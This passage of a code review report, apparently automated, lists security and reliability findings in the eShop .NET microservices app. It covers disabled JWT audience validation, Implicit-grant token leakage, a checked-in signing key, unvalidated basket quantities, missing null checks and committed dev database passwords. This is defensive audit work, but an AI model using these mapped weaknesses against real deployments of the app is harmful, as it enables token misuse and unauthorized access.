+- **[Code Review] code-0037**: Program.cs:28-29 sets options.KeyManagement.Enabled = false and line 36-37 calls .AddDeveloperSigningCredential(), both marked with '// TODO: Remove/Not recommended for production' comments, but no code branch selects a real key provider for non-development environments. This TODO-without-enforcement pattern is the root cause enabling the checked-in tempkey.jwk to be used as the production signing key.
+  - Evidence/reproduction: src/Identity.API/Program.cs:36
+
+### OrderStatus integration event handlers have no null-guard or exception handling around buyer id lookup — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0039**: All six handlers (OrderStatusChangedTo AwaitingValidation/Cancelled/Paid/Shipped/StockConfirmed/Submitted IntegrationEventHandler) share the identical body: log then 'await orderStatusNotificationService.NotifyOrderStatusChangedAsync(event.BuyerIdentityGuid);' with no null/empty check on the event or BuyerIdentityGuid and no try/catch. NotifyOrderStatusChangedAsync (OrderStatusNotificationService.cs line 31) calls a Dictionary TryGetValue(buyerId, ...) which throws ArgumentNullException if buyerId is null. Since BuyerIdentityGuid is a plain string on the event record with no validation, a malformed/missing value in the upstream event payload propagates an unhandled exception straight out of Handle with nothing in these files to catch it -- a resiliency gap in this background event-processing path.
+  - Evidence/reproduction: src/WebApp/Services/OrderStatus/IntegrationEvents/EventHandling/OrderStatusChangedToAwaitingValidationIntegrationEventHandler.cs:10-14 (and 5 sibling handlers in same directory)
+
+### Deprecated Implicit grant type used for Swagger UI clients — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0040**: basketswaggerui (line 148), orderingswaggerui (line 163), and webhooksswaggerui (line 178) in Configuration/Config.cs use AllowedGrantTypes = GrantTypes.Implicit with AllowAccessTokensViaBrowser = true and no client secret. The Implicit flow returns access tokens in the URL fragment, which can leak via browser history, Referer headers, or logs, and is deprecated in favor of Authorization Code + PKCE. If these Swagger endpoints are reachable outside a trusted network, this is a token-leakage risk.
+  - Evidence/reproduction: src/Identity.API/Configuration/Config.cs:148
+
+### Basket deleted after checkout without verifying order creation succeeded — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0041**: BasketState.CheckoutAsync does 'await orderingService.CreateOrder(request, checkoutInfo.RequestId); await DeleteBasketAsync();'. OrderingService.CreateOrder returns the raw httpClient.SendAsync(requestMessage) result and never calls EnsureSuccessStatusCode() or checks IsSuccessStatusCode. If Ordering.API rejects the request (validation failure, 5xx, etc.), await on SendAsync completes normally (HttpClient does not throw for non-2xx by default), so CheckoutAsync proceeds to delete the basket and the UI navigates to the orders page as if checkout succeeded -- the basket contents are silently lost with no order actually placed.
+  - Evidence/reproduction: src/WebApp/Services/BasketState.cs:107-108
+
+### Unvalidated Page query parameter can produce negative or huge pageIndex sent to backend — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0047**: Catalog.razor exposes '[SupplyParameterFromQuery] public int? Page' straight from the URL query string with no bounds check before computing 'Page.GetValueOrDefault(1) - 1' and forwarding it into CatalogService.GetCatalogItems, which passes it unchecked into the backend request URL as pageIndex={pageIndex} (CatalogService.cs GetAllCatalogItemsUri). A crafted value such as ?Page=0, ?Page=-500000, or ?Page=2000000000 produces a negative or huge pageIndex sent to the backend catalog API with no client-side or shared-library validation.
+  - Evidence/reproduction: src/WebApp/Components/Pages/Catalog/Catalog.razor:40-41,56-60
+
+### Null-forgiving operator on deserialized HTTP results without null-guard across CatalogService — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0048**: GetCatalogItems(pageIndex,...), GetCatalogItems(ids), GetCatalogItemsWithSemanticRelevance, GetBrands, and GetTypes in CatalogService.cs all do 'var result = await httpClient.GetFromJsonAsync<T>(uri); return result!;'. GetFromJsonAsync<T> returns null if the response body is empty or the literal JSON null. Every one of these methods suppresses the nullable warning with '!' instead of guarding, so a NullReferenceException can propagate later (e.g. catalogResult.Data in Catalog.razor) if the backend ever returns an empty/null body with a 200 status.
+  - Evidence/reproduction: src/WebAppComponents/Services/CatalogService.cs:20-21,27-28,34-35,41-42,48-49
+
+### HttpContext! null-forgiving in 404 handler inconsistent with earlier null-safe access — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0050**: ItemPage.razor null-checks HttpContext with '?.' at line 79 (isLoggedIn = HttpContext?.User.Identity?.IsAuthenticated == true;), acknowledging it can be null, but then in the catch block for HttpRequestException NotFound does 'HttpContext!.Response.StatusCode = 404;'. If HttpContext is actually null when a 404 occurs (e.g. under certain interactive render-mode circumstances where the cascading HttpContext parameter is not supplied), this throws a NullReferenceException instead of rendering the intended not-found UI.
+  - Evidence/reproduction: src/WebApp/Components/Pages/Item/ItemPage.razor:79,83-86
+
+### No CancellationToken used or forwarded in any CatalogService HTTP call — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0051**: None of GetCatalogItem, GetCatalogItems(pageIndex,...), GetCatalogItems(ids), GetCatalogItemsWithSemanticRelevance, GetBrands, or GetTypes in CatalogService.cs accept or pass a CancellationToken to GetFromJsonAsync, and callers (Catalog.razor, ItemPage.razor, CatalogSearch.razor) do not wire one up either. Rapid pagination/filter changes (each re-render triggers a new query) can fire overlapping requests with no way to cancel the stale one, and a disposed component's in-flight request can still attempt to set state after teardown.
+  - Evidence/reproduction: src/WebAppComponents/Services/CatalogService.cs:11-50
+
+### Basket quantity/validation logic is dead code, allowing invalid quantities into Redis — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0052**: BasketItem.Validate() (src/Basket.API/Model/BasketItem.cs:13-23) rejects Quantity < 1, but nothing in the gRPC pipeline calls it: BasketService.MapToCustomerBasket (src/Basket.API/Grpc/BasketService.cs:93-110) copies ProductId/Quantity straight from the client-supplied UpdateBasketRequest into a CustomerBasket, and RedisBasketRepository.UpdateBasketAsync (src/Basket.API/Repositories/RedisBasketRepository.cs:34-48) persists it to Redis verbatim. gRPC endpoints do not run ASP.NET Core MVC model validation, so an authenticated caller can send quantity = -1, 0, or int.MaxValue (or any int32 product_id, per Proto/basket.proto) and it is stored as-is with no server-side rejection. Any downstream consumer that treats basket quantities as positive integers (e.g. order-total/inventory calculations) inherits this unvalidated data.
+  - Evidence/reproduction: src/Basket.API/Grpc/BasketService.cs:93
+
+### PaymentProcessor has no idempotency/dedup protection for duplicate event redelivery — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0054**: OrderStatusChangedToStockConfirmedIntegrationEventHandler.Handle (src/PaymentProcessor/IntegrationEvents/EventHandling/OrderStatusChangedToStockConfirmedIntegrationEventHandler.cs:9-33) is a pure function of @event.OrderId and a static PaymentOptions.PaymentSucceeded flag; it keeps no record of which OrderId/event Id has already been processed, and PaymentProcessor.csproj has no database/persistence dependency at all, so no dedup store is even possible. RabbitMQEventBus.OnMessageReceived (src/EventBusRabbitMQ/RabbitMQEventBus.cs, OnMessageReceived/ProcessEvent) only calls BasicAckAsync after ProcessEvent finishes (exceptions inside the handler are caught and the message is still acked, per the code comment 'Even on exception we take the message off the queue'). However, if the process crashes or the connection drops while awaiting ProcessEvent/handler.Handle (i.e. before that ack is sent), the durable, persistent-mode message is redelivered on reconnect, causing the handler to run again for the same OrderId and publish a second OrderPaymentSucceededIntegrationEvent/OrderPaymentFailedIntegrationEvent. PaymentProcessor itself only simulates a payment gateway here, so no duplicate real-money charge occurs in this component, but any downstream consumer that is not itself idempotent (e.g. Ordering.API reacting to payment-succeeded) would double-process a single logical payment.
+  - Evidence/reproduction: src/PaymentProcessor/IntegrationEvents/EventHandling/OrderStatusChangedToStockConfirmedIntegrationEventHandler.cs:9
+
+### JWT audience validation is disabled despite an audience being configured for Basket.API — MEDIUM
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0055**: Basket.API wires up authentication via AddDefaultAuthentication() (src/Basket.API/Extensions/Extensions.cs:12), which is implemented in the shared src/eShop.ServiceDefaults/AuthenticationExtensions.cs. That method reads Identity:Audience from config (Basket.API/appsettings.json sets it to "basket") and assigns it to options.Audience (line 40), but then explicitly sets options.TokenValidationParameters.ValidateAudience = false (line 49). This means the configured audience is never actually enforced: any JWT issued by the trusted identity provider for a *different* audience (e.g. a token scoped for another resource/service) would still pass validation against Basket.API as long as the issuer matches, weakening the intended per-service authorization boundary. This is a shared helper directly invoked by Basket.API's own startup code, so it materially affects Basket.API's authentication posture even though the helper class itself lives outside the Basket.API directory.
+  - Evidence/reproduction: src/eShop.ServiceDefaults/AuthenticationExtensions.cs:49
+
+### Hardcoded OIDC client secret and RequireHttpsMetadata=false in WebhookClient auth wiring — LOW
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0006**: AddAuthenticationServices sets 'options.ClientSecret = "secret";' as a hardcoded plaintext OIDC client secret, and unconditionally sets 'options.RequireHttpsMetadata = false;' (not gated to Development only), disabling TLS certificate validation for OIDC discovery/token retrieval against the configured Identity authority in all environments.
+  - Evidence/reproduction: src/WebhookClient/Extensions/Extensions.cs:54,58
+
+### Database credential with weak placeholder password committed in appsettings.Development.json — LOW
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0007**: src/Webhooks.API/appsettings.Development.json contains 'ConnectionStrings:WebHooksDB' = "Host=localhost;Database=WebHooksDB;Username=postgres;Password=yourWeak(!)Password" - a real-looking connection string with credentials checked into source control (dev-only, but still a plaintext secret in the repo).
+  - Evidence/reproduction: src/Webhooks.API/appsettings.Development.json:10
+
+### DeleteItemById uses synchronous SingleOrDefault inside an async endpoint — LOW
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0014**: services.Context.CatalogItems.SingleOrDefault(x => x.Id == id) blocks the calling thread-pool thread on the DB round trip instead of using SingleOrDefaultAsync, unlike every other query in the file. Under load this ties up thread-pool threads unnecessarily and can contribute to thread-pool starvation.
+  - Evidence/reproduction: src/Catalog.API/Apis/CatalogApi.cs:394
+
+### Hardcoded database credential in appsettings.Development.json — LOW
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0015**: The connection string CatalogDB=Host=localhost;Database=CatalogDB;Username=postgres;Password=yourWeak(!)Password is committed to source control in plaintext. It is a local-dev-only credential, but it is still a plaintext secret in the repo, and it is exactly the kind of file that becomes readable by an unauthenticated remote attacker through the path-traversal bug in GetItemPictureById.
+  - Evidence/reproduction: src/Catalog.API/appsettings.Development.json:3
+
+### Missing null check on order lookup in payment-verified domain event handler — LOW
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0032**: orderToUpdate from _orderRepository.GetAsync(domainEvent.OrderId) is used directly with no null check, unlike other handlers (Cancel/Ship/SetPaid all check for null). If the order can't be found, this throws an unhandled NullReferenceException inside domain-event dispatch.
+  - Evidence/reproduction: src/Ordering.API/Application/DomainEventHandlers/UpdateOrderWhenBuyerAndPaymentMethodVerifiedDomainEventHandler.cs:21
+
+### Hardcoded dev DB password committed in appsettings.Development.json — LOW
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0033**: The connection string contains a hardcoded plaintext password. Low risk since it targets localhost and is clearly a dev placeholder, but it is still a committed plaintext credential.
+  - Evidence/reproduction: src/Ordering.API/appsettings.Development.json:3
+
+### JS module reference leaked, never disposed — LOW
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0035**: jsModule is assigned from JS.InvokeAsync<IJSObjectReference>(import, Chatbot.razor.js), which implements IAsyncDisposable, but Chatbot.razor does not implement IDisposable/IAsyncDisposable to dispose jsModule, leaking the JS module reference for the lifetime of each component instance/circuit.
+  - Evidence/reproduction: src/WebApp/Components/Chatbot/Chatbot.razor:83
+
+### Null-forgiving operator on possibly-null catalog item in AddToCart tool — LOW
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0038**: ChatState.AddToCart does 'var item = await _catalogService.GetCatalogItem(itemId); await _basketState.AddAsync(item!);'. GetCatalogItem can return null for an unknown itemId (the id is supplied by the LLM tool-call argument), and item! suppresses the nullable warning instead of checking. A resulting NullReferenceException would be caught by the surrounding catch(Exception e) and turned into a generic error string, so it is not a crash, but the missing explicit null check means the user gets a generic error instead of a clear item-not-found response.
+  - Evidence/reproduction: src/WebApp/Components/Chatbot/ChatState.cs:141-142
+
+### Dev database credentials committed to source control — LOW
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0042**: appsettings.Development.json:3 contains a plaintext connection string 'Host=localhost;Database=IdentityDB;Username=postgres;Password=yourWeak(!)Password' checked into git. Scoped to Development, and mirrors a repo-wide convention across other eShop services, but should still be treated as compromised if the repo is public.
+  - Evidence/reproduction: src/Identity.API/appsettings.Development.json:3
+
+### Unhandled KeyNotFoundException if a basket references a product removed from the catalog — LOW
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0043**: FetchCoreAsync builds catalogItems as a Dictionary from GetCatalogItems(productIds), then does 'var catalogItem = catalogItems[item.ProductId];' using the dictionary indexer rather than TryGetValue. If a product referenced in the persisted basket has been removed/deactivated in the catalog service (or the catalog service omits it from the response), this throws KeyNotFoundException, breaking the cart/checkout page for that user with no graceful handling.
+  - Evidence/reproduction: src/WebApp/Services/BasketState.cs:132-135
+
+### Null-forgiving operator on form-supplied nullable ints without validation — LOW
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0044**: CartPage.razor does 'var id = UpdateQuantityId!.Value; var quantity = UpdateQuantityValue!.Value;' where UpdateQuantityId/UpdateQuantityValue are [SupplyParameterFromForm] nullable ints bound to client-controlled form fields. If a crafted POST to this enhanced-navigation form omits those fields, they are null and .Value throws InvalidOperationException, causing a request failure for that submission instead of a graceful validation error.
+  - Evidence/reproduction: src/WebApp/Components/Pages/Cart/CartPage.razor:111-112
+
+### Discarded (fire-and-forget) Task in exception handler — LOW
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0045**: In the catch block, '_ = DispatchExceptionAsync(ex);' discards the returned Task rather than awaiting or observing it. If that task itself faults, the exception is unobserved and only surfaces (if at all) as an UnobservedTaskException during GC, not as an actionable error.
+  - Evidence/reproduction: src/WebApp/Components/Pages/User/OrdersRefreshOnStatusChange.razor:33
+
+### Dangling scope references not registered as ApiScope/ApiResource — LOW
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0046**: The maui client lists 'mobileshoppingagg' (Config.cs:66) and the webapp client lists 'webshoppingagg' (Config.cs:106) in AllowedScopes, but neither is registered in Config.GetApiScopes()/GetApis(), nor referenced elsewhere in src/. IdentityServer silently drops unregistered scopes from issued tokens, likely breaking intended BFF/aggregator authorization for these clients.
+  - Evidence/reproduction: src/Identity.API/Configuration/Config.cs:66
+
+### Unused RedirectService has no host/allow-list validation — LOW
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0049**: RedirectService.ExtractRedirectUriFromReturnUrl does naive HtmlDecode + Regex.Split on 'redirect_uri='/'signin-oidc'/'scope' substrings with no allow-list or host validation. It's registered in DI (IRedirectService) via Program.cs:41 but not currently invoked by any controller/view, so it poses no live risk today. If ever wired into a redirect decision it would reintroduce an open-redirect vector; should be removed or hardened before use.
+  - Evidence/reproduction: src/Identity.API/Services/RedirectService.cs:1
+
+### Basket keys in Redis have no TTL and no size cap, allowing unbounded growth — LOW
+
+- **Status**: new
+- **Detected by**: Code Review
+- **[Code Review] code-0053**: RedisBasketRepository.UpdateBasketAsync calls _database.StringSetAsync(GetBasketKey(basket.BuyerId), json) with no expiry (src/Basket.API/Repositories/RedisBasketRepository.cs:37). Basket keys therefore persist in Redis indefinitely unless explicitly deleted via OrderStartedIntegrationEventHandler (src/Basket.API/IntegrationEvents/EventHandling/OrderStartedIntegrationEventHandler.cs:14), which only fires once an order is actually placed. Abandoned baskets, and baskets from users who never check out, live forever. There is also no cap on item count per UpdateBasket call (bounded only by the ~4MB default gRPC message size), so any authenticated caller can repeatedly grow their own basket payload. Over time this is unbounded Redis memory growth / storage-exhaustion risk rather than an acute single-request exploit.
+  - Evidence/reproduction: src/Basket.API/Repositories/RedisBasketRepository.cs:37
+
